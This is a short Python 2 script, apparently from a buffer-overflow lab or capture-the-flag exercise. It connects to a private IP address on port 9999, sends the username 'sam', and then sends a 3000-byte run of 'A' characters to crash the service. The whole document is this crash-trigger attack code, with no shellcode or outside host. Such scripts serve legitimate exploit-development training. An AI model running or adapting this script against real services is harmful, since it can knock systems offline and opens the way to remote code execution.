import socket,sys

address = '10.10.201.170'
port = 9999

uname = "sam"

buffer = "A" * 3000

try:
		print '[+] Sending Buffer'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((address,port))
		s.recv(1024)
		s.send(uname + '\r\n')
		s.recv(1024)
		s.send(buffer + '\r\n')
		s.recv(1024)
except:
		print '[!] unable to connect to application'
		sys.exit(0)
finally:
		s.close()